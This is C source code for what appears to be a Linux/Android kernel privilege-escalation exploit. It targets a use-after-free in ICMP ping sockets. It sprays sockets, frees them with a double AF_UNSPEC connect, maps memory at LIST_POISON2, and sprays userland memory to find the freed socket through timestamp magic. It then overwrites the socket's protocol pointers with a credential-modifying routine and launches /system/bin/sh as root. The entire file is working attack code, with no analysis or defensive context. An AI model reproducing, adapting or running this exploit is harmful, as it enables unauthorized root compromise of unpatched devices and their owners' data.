#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/in.h>
#include <unistd.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/sysinfo.h>

#define MAX_CHILDREN_PROCESS    1024
#define MAX_CHILDREN_SOCKETS    65000
#define MAX_MMAPS               1024

#define MMAP_ADDRESS(x)         (0x10000000 + (x) * MMAP_SIZE)
#define MMAP_BASE(x)		(((unsigned)(x)) & ~(MMAP_SIZE - 1))
#define MMAP_SIZE               (16 * 1024 * 1024)

#define DEFAULT_RESERVE_SIZE    (64 * 1024 * 1024)

#define TIMESTAMP_MAGIC         0x0db4da5f

#define ADDR_ADD(p,n)           ((void *)((char *)(p) + (n)))

#define OFFSET_SK_PROT          0x24
#define OFFSET_SK_STAMP         0x148
#define OFFSET_MC_LIST          0x1c4

#ifndef SIOCGSTAMPNS
#define SIOCGSTAMPNS            0x8907
#endif /* SIOCGSTAMPNS */

#define NSEC_PER_SEC            1000000000

#define LIST_POISON2            0x00200200

#define ARRAY_SIZE(x)           (sizeof (x) / sizeof (*(x)))


extern void obtain_root_privilege_by_modify_task_cred(void);

struct child_status_t {
  int num_sockets;
  int result;
};

static size_t
get_page_size(void)
{
  static size_t pagesize;

  if (pagesize == 0) {
    pagesize = sysconf(_SC_PAGESIZE);
  }

  return pagesize;
}

static int
maximize_fd_limit(void)
{
  struct rlimit rlim;
  int ret;

  ret = getrlimit(RLIMIT_NOFILE, &rlim);
  if (ret != 0) {
    return -1;
  }

  rlim.rlim_cur = rlim.rlim_max;
  setrlimit(RLIMIT_NOFILE, &rlim);

  ret = getrlimit(RLIMIT_NOFILE, &rlim);
  if (ret != 0) {
    return -1;
  }

  return rlim.rlim_cur;
}

static int
wait_for_sockets_created(int pipe_fds[2], int *num_socks_created)
{
  struct timeval timeout;
  fd_set rfds;
  struct child_status_t status;
  int ret;

  *num_socks_created = 0;

  FD_ZERO(&rfds);
  FD_SET(pipe_fds[0], &rfds);

  timeout.tv_sec = 5;
  timeout.tv_usec = 0;

  ret = select(pipe_fds[0] + 1, &rfds, NULL, NULL, &timeout);
  if (ret == -1) {
    perror("select()");
    return -1;
  }

  if (ret == 0) {
    return -1;
  }

  ret = read(pipe_fds[0], &status, sizeof status);
  if (ret == -1) {
    perror("read()");
    return -1;
  }

  if (ret != sizeof (status)) {
    printf("read(): Unexpected EOF\n");
    return -1;
  }

  *num_socks_created = status.num_sockets;

  return status.result;
}

static int
send_status_to_parent(int pipe_fds[2], int num_sockets, int result)
{
  struct child_status_t status;

  memset(&status, 0, sizeof status);

  status.num_sockets = num_sockets;
  status.result = result;

  write(pipe_fds[1], &status, sizeof status);
  close(pipe_fds[1]);

  return 0;
}

static int
wait_to_close(int pipe_fds[2])
{
  char buf[256];

  read(pipe_fds[0], buf, sizeof buf);
  close(pipe_fds[0]);
}

static int
close_all_fds_except_pipe(int pipe_fds[2], int num_fds)
{
  int i;
  int result;

  result = 0;

  for (i = 0; i < num_fds; i++) {
    int ret;

    if (i == pipe_fds[0] || i == pipe_fds[1]) {
      continue;
    }

    ret = close(i);
    if (ret != 0) {
      result = -1;
    }
  }

  return result;
}

static int
setup_vul_socket(int sock)
{
  struct sockaddr_in sa;
  int ret;

  memset(&sa, 0, sizeof sa);
  sa.sin_family = AF_UNSPEC;

  ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
  if (ret != 0) {
    printf("connect(%d) #1: ret = %d\n", sock, ret);
    return -1;
  }

  ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
  if (ret != 0) {
    printf("connect%d() #2: ret = %d\n", sock, ret);
    return -1;
  }

  return 0;
}

static int
create_icmp_socket(void)
{
  struct sockaddr_in sa;
  int sock;
  int ret;

  memset(&sa, 0, sizeof sa);
  sa.sin_family = AF_INET;

  sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
  if (sock == -1) {
    return -1;
  }

  ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
  if (ret != 0) {
    int result;

    result = errno;
    close(sock);
    errno = result;

    return -1;
  }

  return sock;
}

static int
close_icmp_socket(int sock)
{
  return close(sock);
}

static int
do_child_task(int pipe_fds[2], int num_fds)
{
  int socks[num_fds];
  int result;
  int ret;
  int i;

  result = 0;

  close_all_fds_except_pipe(pipe_fds, num_fds);

  for (i = 0; i < num_fds; i++) {
    socks[i] = create_icmp_socket();
    if (socks[i] == -1) {
      result = errno;
      break;
    }
  }

  num_fds = i;

  send_status_to_parent(pipe_fds, num_fds, result);
  wait_to_close(pipe_fds);

  for (i = 0; i < num_fds; i++) {
    ret = close_icmp_socket(socks[i]);
  }

  if (ret == -1) {
    return -1;
  }

  return 0;
}

static int
create_child(int pipe_fds[2], int num_fds, pid_t *pid, int *num_socks_created)
{
  int ret;

  *pid = -1;
  *num_socks_created = 0;

  ret = pipe(pipe_fds);
  if (ret != 0) {
    perror("pipe()");
    return -1;
  }

  *pid = fork();
  if (*pid == -1) {
    perror("fork()");
    return -1;
  }

  if (*pid == 0) {
    do_child_task(pipe_fds, num_fds);
    exit(0);
  }

  ret = wait_for_sockets_created(pipe_fds, num_socks_created);
  if (ret == EMFILE) {
    ret = 0;
  }

  if (ret != 0) {
    kill(*pid,  SIGKILL);
  }

  return ret;
}

static int
close_child_sockets(int pipe_fds[2], pid_t pid)
{
  int timeout;
  int status;
  int success;
  int ret;

  success = 0;

  close(pipe_fds[0]);
  close(pipe_fds[1]);

  for (timeout = 100; timeout > 0; timeout--) {
    ret = waitpid(pid, &status, WNOHANG);
    if (ret != 0) {
      break;
    }

    if (WIFEXITED(status)) {
      success = 1;
      break;
    }

    usleep(10000);
  }

  kill(pid,  SIGKILL);

  ret = waitpid(pid, &status, 0);
  if (ret != 0) {
    return -1;
  }

  if (WIFEXITED(status)) {
    success = 1;
  }

  if (success) {
    return 0;
  }

  return -1;
}

int *
create_vul_sockets(void)
{
  static pid_t pids[MAX_CHILDREN_PROCESS];
  static int pipe_fds[MAX_CHILDREN_PROCESS][2];
  int max_fds;
  int *socks;
  int num_socks;
  int num_children_process;
  int num_children_socks;
  int ret;
  int i;

  printf("Creating target socket..."); 
  fflush(stdout);

  max_fds = maximize_fd_limit();

  socks = malloc((max_fds + 1) * sizeof (*socks));
  if (!socks) {
    printf("\nNo memory\n");
    return NULL;
  }

  num_socks = 0;
  num_children_socks = 0;
  ret = 0;

  for (i = 0; i < MAX_CHILDREN_PROCESS; i++) {
    int max_children_socks;
    int num_socks_created;

    max_children_socks = max_fds;
    if (max_children_socks + num_children_socks > MAX_CHILDREN_SOCKETS) {
      max_children_socks = MAX_CHILDREN_SOCKETS - num_children_socks;
      if (max_children_socks < 1) {
        break;
      }
    }

    ret = create_child(pipe_fds[i], max_children_socks, &pids[i], &num_socks_created);
    if (pids[i] == -1) {
      break;
    }

    num_children_process++;
    num_children_socks += num_socks_created;

    printf(".");
    fflush(stdout);

    if (num_socks < max_fds) {
      socks[num_socks] = create_icmp_socket();
      if (socks[num_socks] == -1) {
        break;
      }

      num_socks++;
    }

    if (ret != 0) {
      break;
    }
  }

  printf(" OK\n");
  printf("%d + %d sockets created\n", num_socks, num_children_socks);

  for (i = 0; i < num_children_process; i++) {
    close_child_sockets(pipe_fds[i], pids[i]);
  }

  if (num_socks < 1) {
    printf("No icmp socket available\n");
    free(socks);
    return NULL;
  }

  socks[num_socks] = -1;

  for (i = 0; i < num_socks; i++) {
    ret = setup_vul_socket(socks[i]);
  }

  return socks;
}

static int
lock_page_in_memory(void *address, size_t size)
{
  int ret;

  ret = mlock(address, size);
  if (ret != 0) {
    return -1;
  }

  return 0;
}

static void
populate_pagetable_for_address(void *address)
{
  *(void **)address = NULL;
}

static void *
protect_crash_when_double_free(void)
{
  void *address;
  size_t pagesize;

  pagesize = get_page_size();

  address = (void *)((LIST_POISON2 / pagesize) * pagesize);

  address =  mmap(address, pagesize,
                 PROT_READ | PROT_WRITE,
                 MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS,
                 -1, 0);

  if (address == MAP_FAILED) {
    return NULL;
  }

  populate_pagetable_for_address(address);
  lock_page_in_memory(address, pagesize);

  return address;
}

static int
free_protect(void *protect)
{
  size_t pagesize;

  pagesize = get_page_size();
  return munmap(protect, pagesize);
}

static void
fill_with_payload(void *address, size_t size)
{
  unsigned *p = address;
  int i;

  for (i = 0; i < size; i += sizeof (*p) * 2) {
    *p++ = (unsigned)p;
    *p++ = TIMESTAMP_MAGIC;
  }
}

static int
get_sk_from_timestamp(int sock)
{
  struct timespec tv;
  uint64_t value;
  unsigned high;
  unsigned low;
  int ret;

  ret = ioctl(sock, SIOCGSTAMPNS, &tv);
  if (ret != 0) {
    return -1;
  }

  value = ((uint64_t)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec;
  high = (unsigned)(value >> 32);
  low = (unsigned)value;

  if (high == TIMESTAMP_MAGIC) {
    return low - OFFSET_SK_STAMP;
  }

  return 0;
}

static int
try_control_sk(int *socks)
{
  static int reserve_size = DEFAULT_RESERVE_SIZE;
  static int loop_count = 0;
  static void *address[MAX_MMAPS];
  struct sysinfo info;
  int success;
  int count;
  int i;
  int ret;

  success = 0;

  loop_count++;

  for (i = 0; i < MAX_MMAPS; i++) {
    int j;

    ret = sysinfo(&info);
    if (ret == 0) {
      if (info.freeram < reserve_size) {
        if (loop_count < 4) {
          reserve_size = info.freeram;
        }

        break;
      }
    }

    address[i] =  mmap((void *)MMAP_ADDRESS(i), MMAP_SIZE,
                       PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    if (address[i] == MAP_FAILED) {
      printf("mmap(): failed: %s (%d)\n", strerror(errno), errno);
      break;
    }

    lock_page_in_memory(address[i], MMAP_SIZE);
    fill_with_payload(address[i], MMAP_SIZE);

    for (j = 0; socks[j] != -1; j++) {
      ret = get_sk_from_timestamp(socks[j]);
      if (ret > 0) {
        success = 1;
        address[i] = 0;
      }
    }

    if (success) {
      break;
    }
  }

  count = i;
  printf("%d bytes allocated\n", count * MMAP_SIZE);

  for (i = 0; i < count; i++) {
    if (address[i]) {
      munmap(address[i], MMAP_SIZE);
    }
  }

  if (success) {
    return 0;
  }

  return -1;
}

static int
setup_get_root(void *sk)
{
  static unsigned prot[256];
  unsigned *mmap_end_address;
  unsigned *p;
  int i;

  for (i = 0; i < ARRAY_SIZE(prot); i++) {
    prot[i] = (unsigned)obtain_root_privilege_by_modify_task_cred;
  }

  mmap_end_address = (void *)MMAP_BASE(sk) + MMAP_SIZE - 1;

  for (i = OFFSET_MC_LIST - 32; i < OFFSET_MC_LIST + 32; i+= 4) {
    p = ADDR_ADD(sk, i);
    if (p > mmap_end_address) {
      break;
    }

    *p = 0;
  }

  for (i = OFFSET_SK_PROT - 32; i < OFFSET_SK_PROT + 32; i+= 4) {
    p = ADDR_ADD(sk, i);
    if (p > mmap_end_address) {
      break;
    }

    *p = (unsigned)prot;
  }
}

static void
keep_invalid_sk(void)
{
  pid_t pid;

  printf("\n");
  printf("There are some invalid sockets.\n");
  printf("Please reboot now to avoid crash...\n");

  pid = fork();
  if (pid == -1 || pid == 0) {
    close(0);
    close(1);
    close(2);

    while (1) {
      sleep(60);
    }
  }
}

static void
do_get_root(int *socks)
{
  int success;
  int has_invalid_sk;
  int ret;
  int i;

  success = 0;
  has_invalid_sk = 0;

  for (i = 0; socks[i] != -1; i++) {
    void *sk;

    ret = get_sk_from_timestamp(socks[i]);
    if (ret <= 0) {
      has_invalid_sk = 1;
      continue;
    }

    success = 1;

    sk = (void *)ret;
    setup_get_root(sk);

    close_icmp_socket(socks[i]);
  }

  if (success) {
    system("/system/bin/sh");
  }

  if (has_invalid_sk) {
    keep_invalid_sk();
  }
}

int
main(int argc, char *const argv[])
{
  void *protect = NULL;
  int *socks;
  int ret;

  protect = protect_crash_when_double_free();
  if (!protect) {
    printf("Error in protect_crash_when_double_free()\n");
    return 1;
  }

  socks = create_vul_sockets();
  if (socks == NULL) {
    return 1;
  }

  while (1) {
    ret = try_control_sk(socks);
    if (ret == 0) {
      printf("Done!\n");
      break;
    }
  }

  do_get_root(socks);

  if (protect) {
    ret = free_protect(protect);
    if (ret != 0) {
      printf("Error in free_protect()\n");
      return -1;
    }
  }

  return 0;
}
